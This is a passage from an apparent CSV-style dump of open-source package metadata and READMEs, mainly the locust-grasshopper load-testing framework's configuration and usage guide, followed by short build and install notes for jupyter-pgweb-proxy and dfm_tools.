consumers to modify, but we mention it so values don't seem to appear ""out of thin air"".

### Categories
The argument list is getting lengthy, so we've broken it down into categories. These
categories are entirely for humans: better readability, understanding and ease of use. 
Once they are all fully loaded by Grasshopper, they will be stored in a single 
`GHConfiguration` object (`dict`). By definition, every argument is in only one category
and there is no overlap of keys between the categories. If the same key is supplied in
multiple categories, they will be merged with the precedence order as they appear in
the table.

| Name        | Scope              | Description/Usage                                                                                                                                                                                                                                         |
|-------------| ------------------ |-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Grasshopper | Session            | Variables that rarely change, may span many test runs.                                                                                                                                                                                                    |
| Test Run    | Session            | Variables that may change per test run, but are the<br/>same for every scenario in the run                                                                                                                                                                |
| Scenario    | Session            | Variables that may change per scenario and are often<br/>scenario specific; Includes user defined variables that are<br/>not declared as command line arguments by Grasshopper.<br/>However, you may use pytest's addoptions hook in your <br/>conftest to define them. |

At least one of the sections must be present in the global configuration file and
eventually this will be the same in the configuration section of a scenario in a scenario 
yaml file. Categories are not used when specifying environment variables or command line
options. We recommend that you use these categories in file sources, but if a variable 
is in the wrong section, it won't actually affect the configuration loading process.

### Using Configuration Values 
Your test(s) may access the complete merged set of key-value pairs via the session scoped 
fixture `complete_configuration`. This returns a `GHConfiguration` object (dict) which
is unique to the current scenario. This value will be re-calculated for each new scenario
executed.

A few perhaps not obvious notes about configuration:
+ use the environment variable convention of all uppercase key names (e.g. `RUNTIME=10`)
to _specify_ a key-value pair via an environment value
+ use the lower case key to _access_ a key from the `GHConfiguration` object 
(e.g. `x = complete_configuration(""runtime"")`) regardless of the original source(s)
+ use `--` before the key name to specify it on the command line (e.g. `--runtime=10`)
+ configure a grasshopper configuration file by creating a session scoped fixture loaded 
by your conftest.py called `grasshopper_config_file_path` which returns the full path to a 
configuration yaml file.
+ grasshopper supports thresholds specified as
  + a json string - required for environment variable or commandline, but also accepted
  from other sources
  + a dict - when passing in via the `scenario_args` method (more details on that below)
  or via a journey class's `defaults` attr.

```python
@pytest.fixture(scope=""session"")
def grasshopper_config_file_path():
    return ""path/to/your/config/file""
```

An example grasshopper configuration file:
```yaml
grasshopper:
  influx_host: 1.1.1.1
test_run:
  users: 1.0
  spawn_rate: 1.0
  runtime: 600
scenario:
  key1 : 'value1'
  key2: 0
```
### Additional Extensions to the configuration loading process

If you would like to include other environment variables that might be present in the
system, you can define a fixture called `extra_env_var_keys` which returns a list of key
names to load from the `os.environ`. Keys that are missing in the environment will not 
be included in the `GHConfiguration` object.

Any environment variables that use the prefix `GH_` will also be included in the 
`GHConfiguration` object. The `GH_` will be stripped before adding and any names that
become zero length after the strip will be discarded. This is a mechanism to include any
scenario arguments you might like to pass via an environment variable.

In the unlikely case that you need to use a different prefix to designate scenario
variables, you can define a fixture called `env_var_prefix_key` which returns a prefix
string. The same rules apply about which values are included in the configuration.

### Commonly used arguments
- `--runtime`: Number of seconds to run each test. Set to 120 by default.
- `--users`: Max number of users that are spawned. Set to 1 by default.
- `--spawn_rate` : Number of users to spawn per second. Set to 1 by default.
- `--shape`: The name of a shape to run for the test. 
If you don't specify a shape or shape instance, then the shape `Default` will be used, 
  which just runs with the users, runtime & spawn_rate specified on the command line (or picks up defaults 
of 1, 1, 120s). See `utils/shapes.py` for available shapes and information on how to add
your own shapes.
- `--scenario_file` If you want a yaml file where you pre-define some args, this is how 
you specify that file path. For example, 
  `scenario_file=example/scenario_example.YAML`. 
- `--scenario_name` If `--scenario_file` was specified, this is the scenario name that is 
within that YAML file that corresponds to the scenario you wish to run. Defaults to None.
- `--tags` See below example: `Loop through a collection of scenarios that match some 
  tag`.
- `--scenario_delay` Adds a delay in seconds between scenarios. Defaults to 0.
- `--influx_host` If you want to report your performance test metrics to some influxdb, 
you must specify a host.
    E.g. `1.1.1.1`. Defaults to None.
- `--influx_port`: Port for your `influx_host` in the case where it is non-default.
- `--influx_user`: Username for your `influx_host`, if you have one.
- `--influx_pwd`: Password for your `influx_host`, if you have one.

## Launching tests with a configuration
All in all, there are a few ways you can actually collect and pass params to a test:

### Run a test with its defaults
`cd example`
`pytest test_example.py ...`

### Run a test with a specific scenario
`cd example`
`pytest test_example.py --scenario_file=example_scenarios.YAML --scenario_name=example_scenario_1 ...`

### Loop through a collection of scenarios that match some tag
`cd example`
`pytest example_scenarios.YAML --tags=smoke ...`

- As shown above, this case involves passing a `.YAML` scenario file into pytest instead of a `.py` file.
- The `--scenario_file` and `--scenario_name` args will be ignored in this case
- The `--tags` arg supports AND/OR operators according to the opensource `tag-matcher` package. More info on these operators can be found [here](https://pypi.org/project/tag-matcher/).
- If no `--tags` arg is specified, then ALL the scenarios in the `.yaml` file will be run.
- If a value is given for `--scenario_delay`, the test will wait that many seconds between collected scenarios.
- All scenarios are implicitly tagged with the scenario name to support easily selecting one single
scenario

**Creating a load test **
When creating a new load test, the primary grasshopper function you will be using 
is called `Grasshopper.launch_test`. This function can be imported like so: `from grasshopper.lib.grasshopper import Grasshopper`
`launch_test` takes in a wide variety of args:
- `user_classes`: User classes that the runner will run. These user classes must 
  extend BaseJourney, which is a grasshopper class 
  (`from grasshopper.lib.journeys.base_journey import BaseJourney`). This can be a 
  list of classes or just a single class.
- `**complete_configuration`: In order for the test to have the correct configuration, you 
  must pass in the kwargs provided by the `complete_configuration` fixture. See example 
  load test on how to do this properly.

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Example Load Test  

- You can refer to the test `test_example.py` in the `example` directory for a basic 
  skeleton of how to get a load test running. In the same directory, there is also an 
  example `conftest.py` that will show you how to get basic parameterization working.
- This test can be invoked by running `pytest example/test_example.py` in the root of 
  this project.
- This test can also be invoked via a YAML scenario file: (`cd example`, `pytest 
  example_scenarios.YAML --tags=example1`). In this example scenario file, you can 
  see how grasshopper_args, grasshopper_scenario_args, and tags are being set.

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Scenario Args   

- If you want to parameterize your journey class, you should use the `scenario_args` 
  dict. This is the proper way to pass in values from outside of 
  the journey for access by the journey code. Note that each journey gets a 
  ***copy*** on start, so the journey itself can safely modify its own dictionary 
  once the test is running.
  `scenario_args` exists for any journey that extends the grasshopper `base_journey` 
  class. 
  `scenario_args` also grabs from `self.defaults` on initialization. For example:
```python
from locust import between, task
from grasshopper.lib.journeys.base_journey import BaseJourney
from grasshopper.lib.grasshopper import Grasshopper

# a journey class with an example task
class ExampleJourney(BaseJourney):
    # number of seconds to wait between each task
    wait_time = between(min_wait=20, max_wait=30)
    
    # this defaults dictionary will be merged into scenario_args with lower precedence 
    # when the journey is initialized
    defaults = {
        ""foo"": ""bar"",
    }
    
    @task
    def example_task:
        logging.info(f'foo is `{self.scenario_args.get(""foo"")}`.')
        
        # aggregate all metrics for the below request under the name ""get google""
        # if name is not specified, then the full url will be the name of the metric
        response = self.client.get('https://google.com', name='get google')

# the pytest test which launches the journey class
def test_run_example_journey(complete_configuration):
    # update scenario args before initialization
    ExampleJourney.update_incoming_scenario_args(complete_configuration)
    
    # launch the journey
    locust_env = Grasshopper.launch_test(ExampleJourney, **complete_configuration)
    return locust_env
```
<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Checks
<a id=""checks""></a>
Checks are an assertion that is recorded as a metric. 
They are useful both to ensure your test is working correctly 
(e.g. are you getting a valid id back from some post that you sent) 
and to evaluate if the load is causing intermittent failures 
(e.g. sometimes a percentage of workflow runs don't complete correctly the load increases). 
At the end of the test, checks are aggregated by their name across all journeys that 
ran and then reported to the console. They are also forwarded to the DB 
in the ""checks"" table. Here is an example of using a check: 

```python
from grasshopper.lib.util.utils import check
...
response = self.client.get(
    'https://google.com', name='get google'
)
check(
    ""get google responded with a 200"",
    response.status_code == 200,
    env=self.environment,
)
```
It is worth noting that it is NOT necessary to add checks on the http codes. All the 
HTTP return codes are tracked automatically by grasshopper and will be sent to the DB. 
If you aren't using a DB then you might want the checks console output.
<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Custom Trends
<a id=""custom-trends""></a>
Custom trends are useful when you want to time something that spans multiple HTTP 
calls. They are reported to the specified database just like any other HTTP request, 
but with the ""CUSTOM"" HTTP verb as opposed to ""GET"", ""POST"", etc. Here is an example 
of using a custom trend:
```python
from locust import between, task
from grasshopper.lib.util.utils import custom_trend
...

@task
@custom_trend(""my_custom_trend"")
def google_get_journey(self)
    for i in range(len(10)):
        response = self.client.get(
            'https://google.com', name='get google', context={'foo1':'bar1'}
        )
```
<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Thresholds
<a id=""thresholds""></a>
Thresholds are time-based, and can be added to any trend, whether it be a custom 
trend or a request response time. Thresholds are currently based off of the 90th 
percentile of timings. Here is an example of using a threshold: 

```python
# a journey class with an example threshold
from locust import between, task
from grasshopper.lib.journeys.base_journey import BaseJourney
from grasshopper.lib.grasshopper import Grasshopper

class ExampleJourney(BaseJourney):
    # number of seconds to wait between each task
    wait_time = between(min_wait=20, max_wait=30)
    
    @task
    def example_task:
        self.client.get(""https://google.com"", name=""get google"")
        
    @task
    @custom_trend(""my custom trend"")
    def example_task_custom_trend:
        time.sleep(10)

# the pytest test which launches the journey class, thresholds could be 
# parameterized here as well.
def test_run_example_journey(complete_configuration):
    ExampleJourney.update_incoming_scenario_args(complete_configuration)
    ExampleJourney.update_incoming_scenario_args({
        ""thresholds"": {
            ""{GET}get google"": 4000, # 4 second HTTP response threshold
            ""{CUSTOM}my custom trend"": 11000 # 11 second custom trend threshold
            }
        }) 
    
    locust_env = Grasshopper.launch_test(ExampleJourney, **complete_configuration)
    return locust_env
```

After a test has concluded, trend/threshold data can be found in 
`locust_env.stats.trends`. 
This data is also reported to the console at the end of each test.

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Time Series DB Reporting and Tagging
<a id=""db-reporting""></a>
When you specify a time series database URL param to `launch_test`, such as 
`influx_host`, all metrics will be automatically reported to tables within the `locust` 
timeseries database via the specified URL. These tables include:
- `locust_checks`: check name, check passed, etc.
- `locust_events`: test started, test stopped, etc.
- `locust_exceptions`: error messages
- `locust_requests`: HTTP requests and custom trends

An example grafana dashboard which queries these tables can be found in 
`example/grafana_dashboards`

There are a few ways you can pass in extra tags which 
will be reported to the time series DB:

1. **HTTP Request Tagging**   
     All HTTP requests are automatically tagged with their name. If you want to pass in 
     extra tags for a particular HTTP request, you can pass them in 
     as a dictionary for the `context` param when making a request. For example:

    ```python
    self.client.get('https://google.com', name='get google', context={'foo':'bar'})
    ```
    The tags on this metric would then be: `{'name': 'get google', 'foo': 'bar'}` which 
    would get forwarded to the database if specified. 

2. **Check Tagging**   
   When defining a check, you can pass in extra tags with the `tags` parameter:
    ```python
    from grasshopper.lib.util.utils import check
    ...
    response = self.client.get(
    'https://google.com', name='get google', context={'foo1':'bar1'}
    )
    check(
       ""get google responded with a 200"",
       response.status_code == 200,
       env=self.environment,
       tags = {'foo2': 'bar2'}
    )
    ```

3. **Custom Trend Tagging**   
    Since custom trends are decorators, they do not have access to 
   non-static class variables when defined. Therefore, you must use the 
   `extra_tag_keys` param, which is an array of keys that exist in the journey's 
   scenario_args. So for example, if a journey had the scenario args `{""foo"" : ""bar""}` and you wanted to tag 
   a custom trend based on the ""foo"" scenario arg key, you would do something like this:
    ```python
    from locust import between, task
    from grasshopper.lib.util.utils import custom_trend
    ...
        
    @task
    @custom_trend(""my_custom_trend"", extra_tag_keys=[""foo""])
    def google_get_journey(self)
       for i in range(len(10)):
          response = self.client.get(
             'https://google.com', name='get google', context={'foo1':'bar1'}
          )
    ```
<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Project Roadmap

- [X] Custom Trends
- [X] Checks
- [X] Thresholds
- [X] Tagging
- [X] InfluxDB metric reporting
- [ ] PrometheusDB metric reporting
- [ ] Slack reporting
- [ ] ReportPortal reporting

See the open issues for a full list of proposed features (and known issues).

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag ""enhancement"".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Make sure unit tests pass (`pytest tests/unit`)
4. Add unit tests to keep coverage up, if necessary
5. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
6. Push to the Branch (`git push origin feature/AmazingFeature`)
7. Open a Pull Request

<p align=""right"">(<a href=""#top"">back to top</a>)</p>
","

# Grasshopper

A lightweight framework for performing load tests against an environment, primarily 
against an API. Grasshopper glues [Locust](https://locust.io/), [Pytest](https://docs.pytest.org/en/7.1.x/#), some plugins (namely [Locust InfluxDBListener](https://github.com/hoodoo-digital/locust-influxdb-listener) ) and some custom code to provide a
package that makes authoring load tests simple with very little boilerplate needed.

Here are some key functionalities that this project extends on Locust:
- [checks](#checks)
- [custom trends](#custom-trends)
- [timing thresholds](#thresholds)
- [streamlined metric reporting/tagging system](#db-reporting)
  (only influxDB is supported right now)

## Installation
This package can be installed via pip: `pip install locust-grasshopper`



## Configuring Grasshopper


Grasshopper adds a variety of parameters relating to performance testing along with a
variety of ways to set these values.

Recent changes (>= 1.1.1) include an expanded set of sources, almost full access to all 
arguments via every source (some exceptions outlined below), and the addition of some 
new values that will be used with integrations such as report portal & slack 
(integrations are NYI). These changes are made in a backwards compatible manner, 
meaning all existing grasshopper tests should still run without modification. The 
original fixtures and sources for configuration are deprecated, but still produce the 
same behavior.

All of the usual [pytest arguments](https://docs.pytest.org/en/6.2.x/usage.html) also remain available.

The rest of the sections on configuration assume you are using `locust-grasshopper>=1.1.1`.

### Sources
Currently, there are 5 different sources for configuration values and they are, in 
precedence order 

+ command line arguments
+ environment variables
+ scenario values from a scenario yaml file
+ grasshopper configuration file
+ global defaults (currently stored in code, not configurable by consumers)

Obviously, the global defaults defined by Grasshopper are not really a source for
consumers to modify, but we mention it so values don't seem to appear ""out of thin air"".

### Categories
The argument list is getting lengthy, so we've broken it down into categories. These
categories are entirely for humans: better readability, understanding and ease of use. 
Once they are all fully loaded by Grasshopper, they will be stored in a single 
`GHConfiguration` object (`dict`). By definition, every argument is in only one category
and there is no overlap of keys between the categories. If the same key is supplied in
multiple categories, they will be merged with the precedence order as they appear in
the table.

| Name        | Scope              | Description/Usage                                                                                                                                                                                                                                         |
|-------------| ------------------ |-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Grasshopper | Session            | Variables that rarely change, may span many test runs.                                                                                                                                                                                                    |
| Test Run    | Session            | Variables that may change per test run, but are thesame for every scenario in the run                                                                                                                                                                |
| Scenario    | Session            | Variables that may change per scenario and are oftenscenario specific; Includes user defined variables that arenot declared as command line arguments by Grasshopper.However, you may use pytest's addoptions hook in your conftest to define them. |

At least one of the sections must be present in the global configuration file and
eventually this will be the same in the configuration section of a scenario in a scenario 
yaml file. Categories are not used when specifying environment variables or command line
options. We recommend that you use these categories in file sources, but if a variable 
is in the wrong section, it won't actually affect the configuration loading process.

### Using Configuration Values 
Your test(s) may access the complete merged set of key-value pairs via the session scoped 
fixture `complete_configuration`. This returns a `GHConfiguration` object (dict) which
is unique to the current scenario. This value will be re-calculated for each new scenario
executed.

A few perhaps not obvious notes about configuration:
+ use the environment variable convention of all uppercase key names (e.g. `RUNTIME=10`)
to _specify_ a key-value pair via an environment value
+ use the lower case key to _access_ a key from the `GHConfiguration` object 
(e.g. `x = complete_configuration(""runtime"")`) regardless of the original source(s)
+ use `--` before the key name to specify it on the command line (e.g. `--runtime=10`)
+ configure a grasshopper configuration file by creating a session scoped fixture loaded 
by your conftest.py called `grasshopper_config_file_path` which returns the full path to a 
configuration yaml file.
+ grasshopper supports thresholds specified as
  + a json string - required for environment variable or commandline, but also accepted
  from other sources
  + a dict - when passing in via the `scenario_args` method (more details on that below)
  or via a journey class's `defaults` attr.

```python
@pytest.fixture(scope=""session"")
def grasshopper_config_file_path():
    return ""path/to/your/config/file""
```

An example grasshopper configuration file:
```yaml
grasshopper:
  influx_host: 1.1.1.1
test_run:
  users: 1.0
  spawn_rate: 1.0
  runtime: 600
scenario:
  key1 : 'value1'
  key2: 0
```
### Additional Extensions to the configuration loading process

If you would like to include other environment variables that might be present in the
system, you can define a fixture called `extra_env_var_keys` which returns a list of key
names to load from the `os.environ`. Keys that are missing in the environment will not 
be included in the `GHConfiguration` object.

Any environment variables that use the prefix `GH_` will also be included in the 
`GHConfiguration` object. The `GH_` will be stripped before adding and any names that
become zero length after the strip will be discarded. This is a mechanism to include any
scenario arguments you might like to pass via an environment variable.

In the unlikely case that you need to use a different prefix to designate scenario
variables, you can define a fixture called `env_var_prefix_key` which returns a prefix
string. The same rules apply about which values are included in the configuration.

### Commonly used arguments
- `--runtime`: Number of seconds to run each test. Set to 120 by default.
- `--users`: Max number of users that are spawned. Set to 1 by default.
- `--spawn_rate` : Number of users to spawn per second. Set to 1 by default.
- `--shape`: The name of a shape to run for the test. 
If you don't specify a shape or shape instance, then the shape `Default` will be used, 
  which just runs with the users, runtime & spawn_rate specified on the command line (or picks up defaults 
of 1, 1, 120s). See `utils/shapes.py` for available shapes and information on how to add
your own shapes.
- `--scenario_file` If you want a yaml file where you pre-define some args, this is how 
you specify that file path. For example, 
  `scenario_file=example/scenario_example.YAML`. 
- `--scenario_name` If `--scenario_file` was specified, this is the scenario name that is 
within that YAML file that corresponds to the scenario you wish to run. Defaults to None.
- `--tags` See below example: `Loop through a collection of scenarios that match some 
  tag`.
- `--scenario_delay` Adds a delay in seconds between scenarios. Defaults to 0.
- `--influx_host` If you want to report your performance test metrics to some influxdb, 
you must specify a host.
    E.g. `1.1.1.1`. Defaults to None.
- `--influx_port`: Port for your `influx_host` in the case where it is non-default.
- `--influx_user`: Username for your `influx_host`, if you have one.
- `--influx_pwd`: Password for your `influx_host`, if you have one.

## Launching tests with a configuration
All in all, there are a few ways you can actually collect and pass params to a test:

### Run a test with its defaults
`cd example`
`pytest test_example.py ...`

### Run a test with a specific scenario
`cd example`
`pytest test_example.py --scenario_file=example_scenarios.YAML --scenario_name=example_scenario_1 ...`

### Loop through a collection of scenarios that match some tag
`cd example`
`pytest example_scenarios.YAML --tags=smoke ...`

- As shown above, this case involves passing a `.YAML` scenario file into pytest instead of a `.py` file.
- The `--scenario_file` and `--scenario_name` args will be ignored in this case
- The `--tags` arg supports AND/OR operators according to the opensource `tag-matcher` package. More info on these operators can be found [here](https://pypi.org/project/tag-matcher/).
- If no `--tags` arg is specified, then ALL the scenarios in the `.yaml` file will be run.
- If a value is given for `--scenario_delay`, the test will wait that many seconds between collected scenarios.
- All scenarios are implicitly tagged with the scenario name to support easily selecting one single
scenario

**Creating a load test **
When creating a new load test, the primary grasshopper function you will be using 
is called `Grasshopper.launch_test`. This function can be imported like so: `from grasshopper.lib.grasshopper import Grasshopper`
`launch_test` takes in a wide variety of args:
- `user_classes`: User classes that the runner will run. These user classes must 
  extend BaseJourney, which is a grasshopper class 
  (`from grasshopper.lib.journeys.base_journey import BaseJourney`). This can be a 
  list of classes or just a single class.
- `**complete_configuration`: In order for the test to have the correct configuration, you 
  must pass in the kwargs provided by the `complete_configuration` fixture. See example 
  load test on how to do this properly.

(back to top)

## Example Load Test  

- You can refer to the test `test_example.py` in the `example` directory for a basic 
  skeleton of how to get a load test running. In the same directory, there is also an 
  example `conftest.py` that will show you how to get basic parameterization working.
- This test can be invoked by running `pytest example/test_example.py` in the root of 
  this project.
- This test can also be invoked via a YAML scenario file: (`cd example`, `pytest 
  example_scenarios.YAML --tags=example1`). In this example scenario file, you can 
  see how grasshopper_args, grasshopper_scenario_args, and tags are being set.

(back to top)

## Scenario Args   

- If you want to parameterize your journey class, you should use the `scenario_args` 
  dict. This is the proper way to pass in values from outside of 
  the journey for access by the journey code. Note that each journey gets a 
  ***copy*** on start, so the journey itself can safely modify its own dictionary 
  once the test is running.
  `scenario_args` exists for any journey that extends the grasshopper `base_journey` 
  class. 
  `scenario_args` also grabs from `self.defaults` on initialization. For example:
```python
from locust import between, task
from grasshopper.lib.journeys.base_journey import BaseJourney
from grasshopper.lib.grasshopper import Grasshopper

# a journey class with an example task
class ExampleJourney(BaseJourney):
    # number of seconds to wait between each task
    wait_time = between(min_wait=20, max_wait=30)
    
    # this defaults dictionary will be merged into scenario_args with lower precedence 
    # when the journey is initialized
    defaults = {
        ""foo"": ""bar"",
    }
    
    @task
    def example_task:
        logging.info(f'foo is `{self.scenario_args.get(""foo"")}`.')
        
        # aggregate all metrics for the below request under the name ""get google""
        # if name is not specified, then the full url will be the name of the metric
        response = self.client.get('https://google.com', name='get google')

# the pytest test which launches the journey class
def test_run_example_journey(complete_configuration):
    # update scenario args before initialization
    ExampleJourney.update_incoming_scenario_args(complete_configuration)
    
    # launch the journey
    locust_env = Grasshopper.launch_test(ExampleJourney, **complete_configuration)
    return locust_env
```
(back to top)

## Checks

Checks are an assertion that is recorded as a metric. 
They are useful both to ensure your test is working correctly 
(e.g. are you getting a valid id back from some post that you sent) 
and to evaluate if the load is causing intermittent failures 
(e.g. sometimes a percentage of workflow runs don't complete correctly the load increases). 
At the end of the test, checks are aggregated by their name across all journeys that 
ran and then reported to the console. They are also forwarded to the DB 
in the ""checks"" table. Here is an example of using a check: 

```python
from grasshopper.lib.util.utils import check
...
response = self.client.get(
    'https://google.com', name='get google'
)
check(
    ""get google responded with a 200"",
    response.status_code == 200,
    env=self.environment,
)
```
It is worth noting that it is NOT necessary to add checks on the http codes. All the 
HTTP return codes are tracked automatically by grasshopper and will be sent to the DB. 
If you aren't using a DB then you might want the checks console output.
(back to top)

## Custom Trends

Custom trends are useful when you want to time something that spans multiple HTTP 
calls. They are reported to the specified database just like any other HTTP request, 
but with the ""CUSTOM"" HTTP verb as opposed to ""GET"", ""POST"", etc. Here is an example 
of using a custom trend:
```python
from locust import between, task
from grasshopper.lib.util.utils import custom_trend
...

@task
@custom_trend(""my_custom_trend"")
def google_get_journey(self)
    for i in range(len(10)):
        response = self.client.get(
            'https://google.com', name='get google', context={'foo1':'bar1'}
        )
```
(back to top)

## Thresholds

Thresholds are time-based, and can be added to any trend, whether it be a custom 
trend or a request response time. Thresholds are currently based off of the 90th 
percentile of timings. Here is an example of using a threshold: 

```python
# a journey class with an example threshold
from locust import between, task
from grasshopper.lib.journeys.base_journey import BaseJourney
from grasshopper.lib.grasshopper import Grasshopper

class ExampleJourney(BaseJourney):
    # number of seconds to wait between each task
    wait_time = between(min_wait=20, max_wait=30)
    
    @task
    def example_task:
        self.client.get(""https://google.com"", name=""get google"")
        
    @task
    @custom_trend(""my custom trend"")
    def example_task_custom_trend:
        time.sleep(10)

# the pytest test which launches the journey class, thresholds could be 
# parameterized here as well.
def test_run_example_journey(complete_configuration):
    ExampleJourney.update_incoming_scenario_args(complete_configuration)
    ExampleJourney.update_incoming_scenario_args({
        ""thresholds"": {
            ""{GET}get google"": 4000, # 4 second HTTP response threshold
            ""{CUSTOM}my custom trend"": 11000 # 11 second custom trend threshold
            }
        }) 
    
    locust_env = Grasshopper.launch_test(ExampleJourney, **complete_configuration)
    return locust_env
```

After a test has concluded, trend/threshold data can be found in 
`locust_env.stats.trends`. 
This data is also reported to the console at the end of each test.

(back to top)

## Time Series DB Reporting and Tagging

When you specify a time series database URL param to `launch_test`, such as 
`influx_host`, all metrics will be automatically reported to tables within the `locust` 
timeseries database via the specified URL. These tables include:
- `locust_checks`: check name, check passed, etc.
- `locust_events`: test started, test stopped, etc.
- `locust_exceptions`: error messages
- `locust_requests`: HTTP requests and custom trends

An example grafana dashboard which queries these tables can be found in 
`example/grafana_dashboards`

There are a few ways you can pass in extra tags which 
will be reported to the time series DB:

1. **HTTP Request Tagging**   
     All HTTP requests are automatically tagged with their name. If you want to pass in 
     extra tags for a particular HTTP request, you can pass them in 
     as a dictionary for the `context` param when making a request. For example:

    ```python
    self.client.get('https://google.com', name='get google', context={'foo':'bar'})
    ```
    The tags on this metric would then be: `{'name': 'get google', 'foo': 'bar'}` which 
    would get forwarded to the database if specified. 

2. **Check Tagging**   
   When defining a check, you can pass in extra tags with the `tags` parameter:
    ```python
    from grasshopper.lib.util.utils import check
    ...
    response = self.client.get(
    'https://google.com', name='get google', context={'foo1':'bar1'}
    )
    check(
       ""get google responded with a 200"",
       response.status_code == 200,
       env=self.environment,
       tags = {'foo2': 'bar2'}
    )
    ```

3. **Custom Trend Tagging**   
    Since custom trends are decorators, they do not have access to 
   non-static class variables when defined. Therefore, you must use the 
   `extra_tag_keys` param, which is an array of keys that exist in the journey's 
   scenario_args. So for example, if a journey had the scenario args `{""foo"" : ""bar""}` and you wanted to tag 
   a custom trend based on the ""foo"" scenario arg key, you would do something like this:
    ```python
    from locust import between, task
    from grasshopper.lib.util.utils import custom_trend
    ...
        
    @task
    @custom_trend(""my_custom_trend"", extra_tag_keys=[""foo""])
    def google_get_journey(self)
       for i in range(len(10)):
          response = self.client.get(
             'https://google.com', name='get google', context={'foo1':'bar1'}
          )
    ```
(back to top)

## Project Roadmap

- [X] Custom Trends
- [X] Checks
- [X] Thresholds
- [X] Tagging
- [X] InfluxDB metric reporting
- [ ] PrometheusDB metric reporting
- [ ] Slack reporting
- [ ] ReportPortal reporting

See the open issues for a full list of proposed features (and known issues).

(back to top)

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag ""enhancement"".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Make sure unit tests pass (`pytest tests/unit`)
4. Add unit tests to keep coverage up, if necessary
5. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
6. Push to the Branch (`git push origin feature/AmazingFeature`)
7. Open a Pull Request

(back to top)
",alteryx/locust-grasshopper
jupyter-pgweb-proxy,https://github.com/huntdatacenter/jupyter-pgweb-proxy,5,98,98,"# jupyter-pgweb-proxy

## Build

```
python3 -m pip install hatch

hatch build

ls -la dist/*
```
","# jupyter-pgweb-proxy

## Build

```
python3 -m pip install hatch

hatch build

ls -la dist/*
```
",huntdatacenter/jupyter-pgweb-proxy
dfm-tools,https://github.com/Deltares/dfm_tools,33,3492,3492,"[![pytest-py38](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py38.yml/badge.svg?branch=main)](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py38.yml)
[![pytest-py39](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py39.yml/badge.svg?branch=main)](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py39.yml)
[![pytest-py310](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py310.yml/badge.svg?branch=main)](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py310.yml)
[![codecov](https://img.shields.io/codecov/c/github/deltares/dfm_tools.svg?style=flat-square)](https://app.codecov.io/gh/deltares/dfm_tools?displayType=list)
[![generate-documentation](https://github.com/Deltares/dfm_tools/actions/workflows/generate-documentation.yml/badge.svg)](https://github.com/Deltares/dfm_tools/actions/workflows/generate-documentation.yml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=Deltares_dfm_tools&metric=alert_status)](https://sonarcloud.io/summary/overall?id=Deltares_dfm_tools)
[![Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/Deltares/dfm_tools/HEAD)

dfm_tools
=========

A Python package for pre- and postprocessing D-FlowFM model input and output files. Contains convenience functions built on top of other packages like [xarray](https://github.com/pydata/xarray), [xugrid](https://github.com/Deltares/xugrid), [hydrolib-core](https://github.com/Deltares/HYDROLIB-core) and many more.

Information and examples
--------
- [pdf](https://nbviewer.org/github/Deltares/dfm_tools/raw/pptx/docs/dfm_tools.pdf?flush_cache=true) with dfm_tools information, features and examples
- [online documentation](https://htmlpreview.github.io/?https://github.com/Deltares/dfm_tools/blob/main/docs/dfm_tools/index.html) generated from docstrings
- [jupyter notebooks](https://github.com/Deltares/dfm_tools/blob/main/notebooks) with example code
- [use binder](https://mybinder.org/v2/gh/Deltares/dfm_tools/HEAD) to run these notebooks interactively (loading takes a while)
- [github folder](https://github.com/Deltares/dfm_tools/tree/main/tests/examples) with more example scripts

Installation basics
--------
- latest release: ``pip install dfm_tools`` (excludes ``cartopy`` since it is only installable via conda)

Installation recommendation
--------
- download and install Anaconda 64 bit (with Python 3.8 or later) from https://www.anaconda.com/distribution/#download-section
- open Anaconda prompt
- ``conda create --name dfm_tools_env -c conda-forge python=3.8 spyder -y`` (you can also install a newer python version)
- ``conda activate dfm_tools_env``
- ``conda install -c conda-forge git shapely cartopy pyepsg geopandas contextily xarray dask netcdf4 bottleneck xugrid cdsapi pydap -y`` (installs conda-forge requirements)
- ``python -m pip install git+https://github.com/Deltares/dfm_tools`` (this command installs dfm_tools and all required non-conda packages, also use to update)
- long paths error? Check [this Github issue](https://github.com/Deltares/HYDROLIB-core/issues/327#issuecomment-1266534032)
- OpenSSL error? Fix your conda base env by doing [this](https://github.com/conda/conda/issues/11795#issuecomment-1335666474) or maybe [this](https://github.com/conda/conda/issues/11795#issuecomment-1382661765). Let us know if you encounter this issue.
- to remove environment when necessary: ``conda remove -n dfm_tools_env --all``
","[![pytest-py38](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py38.yml/badge.svg?branch=main)](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py38.yml)
[![pytest-py39](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py39.yml/badge.svg?branch=main)](https://github.com/Deltares/dfm_tools/actions/workflows/pytest-py39.yml)
